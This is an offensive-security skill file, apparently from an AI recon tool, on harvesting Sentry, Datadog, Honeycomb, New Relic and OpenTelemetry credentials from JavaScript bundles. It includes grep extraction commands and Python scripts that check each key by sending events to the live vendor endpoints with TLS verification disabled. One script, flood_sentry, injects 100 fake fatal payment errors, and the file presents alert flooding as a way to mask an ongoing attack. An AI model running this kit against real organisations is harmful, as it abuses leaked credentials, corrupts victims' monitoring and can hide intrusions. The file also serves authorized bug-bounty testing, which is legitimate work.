<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: monitoring-secrets-exposure
description: Detect and exploit exposed monitoring/observability credentials including Sentry DSN, OpenTelemetry keys, Datadog API keys, Honeycomb tokens, and similar secrets in JS bundles and HTTP responses
---

# Monitoring & Observability Secrets Exposure

Monitoring SDKs (Sentry, Datadog, Honeycomb, OpenTelemetry, New Relic, Rollbar, Bugsnag, LogRocket) are intentionally initialized client-side — their credentials land in every JS bundle. These credentials are write-keys by design, but they allow arbitrary event injection into production monitoring pipelines, enabling alert fatigue attacks, incident masking, and metric poisoning.

**Critical mindset:** A monitoring secret is NOT just "a low-severity info leak." It is write access to the target's error/alerting/tracing infrastructure. During an active attack campaign, injecting noise into Sentry/Datadog can mask the real attack.

---

## STEP 1 — Extract Monitoring Credentials from JS Bundles

```bash
# After downloading JS files to output/js_files/ (see javascript_analysis.md):

# === SENTRY ===
# Pattern: full DSN format
grep -roh 'https://[a-f0-9]\{32\}@o[0-9]\{4,12\}\.ingest\.sentry\.io/[0-9]\{4,12\}' \
  output/js_files/ 2>/dev/null | sort -u | tee output/sentry_dsn.txt

# Pattern: split DSN (key and project ID stored separately)
grep -roh 'sentry[_-]\?key[^"'"'"']\{0,20\}["\`'"'"'][a-f0-9]\{32\}["\`'"'"']' \
  output/js_files/ -i 2>/dev/null | head -10 >> output/sentry_dsn.txt
grep -roh '"dsn"[^"]\{0,10\}"[^"]\{10,120\}"' output/js_files/ -i 2>/dev/null >> output/sentry_dsn.txt

# Pattern: Sentry init call
grep -roh 'Sentry\.init[^}]\{20,300\}' output/js_files/ 2>/dev/null | head -5 >> output/sentry_dsn.txt

# === DATADOG ===
grep -roh 'DD_API_KEY[^"'"'"'`]\{0,10\}["\`'"'"'][a-zA-Z0-9]\{32,40\}["\`'"'"']' \
  output/js_files/ -i 2>/dev/null | tee output/datadog_keys.txt
grep -roh '"clientToken"[^"]\{0,5\}"[a-z0-9]\{20,50\}"' \
  output/js_files/ -i 2>/dev/null >> output/datadog_keys.txt
grep -roh 'applicationId[^"]\{0,10\}"[a-f0-9-]\{30,50\}"' \
  output/js_files/ -i 2>/dev/null >> output/datadog_keys.txt

# === HONEYCOMB ===
grep -roh 'HONEYCOMB[_A-Z]*[^"'"'"'`]\{0,10\}["\`'"'"'][a-zA-Z0-9]\{20,40\}["\`'"'"']' \
  output/js_files/ -i 2>/dev/null | tee output/honeycomb_keys.txt
grep -roh '"x-honeycomb-team"[^"]\{0,10\}"[^"]\{10,50\}"' \
  output/js_files/ -i 2>/dev/null >> output/honeycomb_keys.txt

# === NEW RELIC ===
grep -roh 'NRAK-[A-Z0-9]\{42\}' output/js_files/ 2>/dev/null | tee output/newrelic_keys.txt
grep -roh '"licenseKey"[^"]\{0,10\}"[A-Za-z0-9]\{32,50\}"' \
  output/js_files/ -i 2>/dev/null >> output/newrelic_keys.txt

# === ROLLBAR ===
grep -roh '"accessToken"[^"]\{0,10\}"[a-f0-9]\{32\}"' \
  output/js_files/ -i 2>/dev/null | tee output/rollbar_keys.txt

# === OPENTELEMETRY / OTEL ===
grep -roh 'OTEL[_A-Z]*[^"'"'"'`]\{0,10\}["\`'"'"'][a-zA-Z0-9+/=]\{20,80\}["\`'"'"']' \
  output/js_files/ -i 2>/dev/null | tee output/otel_keys.txt
grep -roh '"Authorization"[^"]\{0,10\}"[Bb]earer [a-zA-Z0-9._-]\{20,200\}"' \
  output/js_files/ 2>/dev/null >> output/otel_keys.txt

echo "=== SUMMARY ==="
echo "Sentry DSNs: $(wc -l < output/sentry_dsn.txt 2>/dev/null || echo 0)"
echo "Datadog keys: $(wc -l < output/datadog_keys.txt 2>/dev/null || echo 0)"
echo "Honeycomb keys: $(wc -l < output/honeycomb_keys.txt 2>/dev/null || echo 0)"
echo "NewRelic keys: $(wc -l < output/newrelic_keys.txt 2>/dev/null || echo 0)"
echo "Rollbar keys: $(wc -l < output/rollbar_keys.txt 2>/dev/null || echo 0)"
```

---

## STEP 2 — Validate Sentry DSN Write Access

**CRITICAL:** Always validate. A DSN present in JS does not guarantee the project is still active.

```python
# tools/validate_sentry.py
import sys, json, urllib.request, urllib.error, ssl, time, uuid

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def validate_sentry_dsn(dsn):
    """
    DSN format: https://<key>@<host>/api/<project_id>
    or: https://<key>@o<org>.ingest.sentry.io/<project_id>
    """
    import re
    m = re.match(r'https://([a-f0-9]{32})@([^/]+)/(\d+)', dsn)
    if not m:
        print(f"[!] Cannot parse DSN: {dsn}")
        return False
    key, host, project_id = m.groups()

    # Store endpoint (legacy, direct JSON) - most reliable
    store_url = f"https://{host}/api/{project_id}/store/?sentry_key={key}"
    event = {
        "event_id": uuid.uuid4().hex,
        "platform": "javascript",
        "level": "info",
        "message": "security-probe-validation",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()),
        "tags": {"probe": "authorized-security-test"},
        "extra": {"researcher_note": "Bug bounty DSN validation - please rotate this key"}
    }

    try:
        req = urllib.request.Request(
            store_url,
            data=json.dumps(event).encode(),
            headers={"Content-Type": "application/json", "User-Agent": "sentry.javascript.browser/7.0.0"},
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=15, context=ctx) as r:
            body = r.read().decode()
            result = json.loads(body)
            if "id" in result:
                print(f"[CONFIRMED] DSN VALID - Write access confirmed!")
                print(f"  DSN: {dsn}")
                print(f"  Event ID accepted: {result['id']}")
                print(f"  Store URL: {store_url}")
                return True
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        print(f"[ERROR {e.code}] {body[:200]}")
        if e.code == 403:
            print("  -> DSN exists but rate-limited or domain-restricted")
        elif e.code == 404:
            print("  -> Project does not exist (stale DSN)")
    except Exception as ex:
        print(f"[ERR] {ex}")
    return False

if __name__ == "__main__":
    # Read from extracted file
    try:
        with open("output/sentry_dsn.txt") as f:
            for line in f:
                line = line.strip()
                if "https://" in line:
                    import re
                    dsns = re.findall(r'https://[a-f0-9]{32}@[^"\s]+/\d+', line)
                    for dsn in dsns:
                        validate_sentry_dsn(dsn)
    except FileNotFoundError:
        print("Run step 1 first to extract DSNs")
        if len(sys.argv) > 1:
            validate_sentry_dsn(sys.argv[1])
```

```bash
python3 tools/validate_sentry.py
# Or directly: python3 tools/validate_sentry.py "https://KEY@o12345.ingest.sentry.io/67890"
```

---

## STEP 3 — Validate Datadog RUM Client Token

```python
# tools/validate_datadog.py
import urllib.request, ssl, json

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def validate_datadog_rum(client_token, app_id, site="datadoghq.com"):
    """Test Datadog RUM client token by sending a fake RUM event"""
    url = f"https://browser-intake-{site}/api/v2/rum"

    # RUM event payload format
    payload = json.dumps({
        "type": "rum",
        "application": {"id": app_id},
        "session": {"id": "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee", "type": "user"},
        "view": {"id": "test-view", "url": "https://probe.test/"},
        "_dd": {"format_version": 2}
    }).encode()

    req = urllib.request.Request(
        f"{url}?ddsource=browser&ddtags=probe:true&dd-api-key={client_token}",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
            print(f"[{r.status}] Datadog RUM token valid: {client_token[:16]}...")
            return True
    except urllib.error.HTTPError as e:
        print(f"[{e.code}] Datadog RUM: {e.read().decode()[:100]}")
    return False
```

---

## STEP 4 — Validate Honeycomb Key

```python
# tools/validate_honeycomb.py
import urllib.request, ssl, json

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def validate_honeycomb(api_key, dataset="security-probe"):
    """Send a test event to Honeycomb"""
    url = f"https://api.honeycomb.io/1/events/{dataset}"
    payload = json.dumps({
        "probe": "authorized-security-test",
        "timestamp": "2026-01-01T00:00:00Z"
    }).encode()

    req = urllib.request.Request(
        url, data=payload,
        headers={
            "X-Honeycomb-Team": api_key,
            "Content-Type": "application/json"
        },
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
            print(f"[{r.status}] Honeycomb key VALID: {api_key[:16]}...")
            return True
    except urllib.error.HTTPError as e:
        if e.code == 401:
            print(f"[401] Honeycomb key invalid/rotated")
        elif e.code == 400:
            print(f"[400] Honeycomb key valid (bad payload, key accepted): {api_key[:16]}...")
            return True  # 400 means auth passed
    return False
```

---

## STEP 5 — Assess Impact and Attack Chain

Once a monitoring credential is confirmed valid, assess the full impact:

```bash
cat > tools/monitoring_impact_assessment.py << 'PYEOF'
"""
For each confirmed monitoring credential, assess:
1. Can we READ data? (some tokens are read+write)
2. Can we FLOOD the queue? (DoS the monitoring pipeline)
3. Can we INJECT fake critical alerts? (incident masking)
4. Can we ENUMERATE org/project structure?
"""

import urllib.request, urllib.error, ssl, json, sys

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def assess_sentry_read(auth_token, org_slug):
    """
    Sentry AUTH tokens (different from DSN) allow reading issues.
    If we found an auth token (not just DSN), test read access.
    """
    url = f"https://sentry.io/api/0/organizations/{org_slug}/issues/"
    req = urllib.request.Request(
        url,
        headers={"Authorization": f"Bearer {auth_token}", "User-Agent": "Python/3"}
    )
    try:
        with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
            issues = json.loads(r.read())
            print(f"[READ ACCESS] Sentry issues: {len(issues)} returned")
            for issue in issues[:3]:
                print(f"  - {issue.get('title','?')} ({issue.get('level','?')})")
    except urllib.error.HTTPError as e:
        print(f"[{e.code}] Read access denied: {e.read().decode()[:100]}")

def flood_sentry(dsn, count=100):
    """
    Proof of concept: flood Sentry with fake CRITICAL errors
    WARNING: Only run in authorized environments
    """
    import re, uuid, time
    m = re.match(r'https://([a-f0-9]{32})@([^/]+)/(\d+)', dsn)
    if not m:
        return
    key, host, project_id = m.groups()
    store_url = f"https://{host}/api/{project_id}/store/?sentry_key={key}"

    success = 0
    for i in range(count):
        event = {
            "event_id": uuid.uuid4().hex,
            "platform": "javascript",
            "level": "fatal",
            "message": f"[PROBE-{i}] PaymentProcessor.crash() — Vault connection refused",
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()),
            "exception": {
                "values": [{
                    "type": "CriticalPaymentError",
                    "value": f"Database shard {i % 10} unreachable",
                    "stacktrace": {"frames": [
                        {"filename": "payment-processor.js", "lineno": i+1, "function": "processCard"}
                    ]}
                }]
            }
        }
        req = urllib.request.Request(
            store_url, data=json.dumps(event).encode(),
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        try:
            with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
                success += 1
        except Exception:
            pass
    print(f"Flooded {success}/{count} events successfully")
PYEOF
echo "Impact assessment script ready at tools/monitoring_impact_assessment.py"
```

---

## Key Patterns to Look For

**Sentry DSN anatomy:**
- Full: `https://32hexchars@o{orgid}.ingest.sentry.io/{projectid}`
- Relay DSN: `https://32hexchars@relay.sentry.io/{projectid}` (self-hosted relay)
- Old format: `https://32hexchars:32hexchars@sentry.io/{projectid}`

**Datadog patterns:**
- Client Token: `pub{lowercase-alphanumeric 32+ chars}` (starts with "pub")
- Application ID: UUID format `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`
- API Key: 32 hex chars (admin-level, extremely sensitive)
- App Key: 40 hex chars

**Honeycomb patterns:**
- Ingest keys: `hcaik_` prefix (new format) or 32 hex chars (legacy)
- API endpoints: `api.honeycomb.io` or `api.eu1.honeycomb.io`

**OpenTelemetry credential indicators:**
- `OTEL_EXPORTER_OTLP_HEADERS` containing `Authorization=Basic` or `Authorization=Bearer`
- Basic auth in OTLP HTTP endpoint URL: `https://user:pass@collector.internal/`
- Custom headers with base64-encoded credentials

**New Relic:**
- License key: `NRAK-` followed by 42 alphanumeric chars
- Insert key: 32 hex chars (for custom events)
- Browser agent key: 32 hex chars

---

## Severity Assessment

| Credential | Write Impact | Read Impact | Severity |
|-----------|-------------|-------------|----------|
| Sentry DSN (write-only) | Event injection, alert flooding | None | MEDIUM |
| Datadog RUM token | RUM event injection | None | MEDIUM |
| Datadog API key (admin) | Full API access | Full read | CRITICAL |
| Honeycomb ingest key | Trace injection | None | MEDIUM |
| Honeycomb management key | Full CRUD | Trace data read | HIGH |
| New Relic license key | All event types | None | MEDIUM |
| OTEL Basic Auth credentials | Trace injection | None | MEDIUM-HIGH |

---

## Validation Requirements

1. **Write test:** Confirm the credential accepts a probe event (HTTP 200/202 with event ID)
2. **Confirm production project:** The project name, DSN format, and org ID should match the target
3. **Confirm not revoked:** Some DSNs are left in bundles but revoked — write test proves it
4. **Document evidence:** Save the full request/response pair showing acceptance

---

## False Positives

- **Test/sandbox DSNs:** Look for `environment: "test"` or `sentry_key=test` patterns — likely dev keys
- **404 on store endpoint:** Project deleted or DSN revoked — not reportable
- **403 domain restriction:** Sentry has "Allowed Domains" configured — event rejected but key valid
- **CI/CD monitoring keys:** Keys for GitHub Actions or build pipelines, not production app monitoring

---

## Pro Tips

1. **Sentry DSN rotation:** When reporting, emphasize the key is still active. Rotation takes 5 minutes but companies often delay it.
2. **Batch multiple monitoring systems:** Target applications often have 3+ monitoring SDKs (Sentry + Datadog + Honeycomb). Each is a separate finding.
3. **Ingest endpoint variant:** Try both `https://sentry.io/api/` and `https://o{orgid}.ingest.sentry.io/api/` — some orgs use custom regions (US, EU, DE).
4. **Don't flood:** Sending 1 probe event is sufficient proof. Flooding causes actual harm and undermines the report.
5. **Correlation:** Check if the DSN org ID `o451871` appears in the `network_*.txt` browser captures — it will show real error submissions confirming the project is active in production.
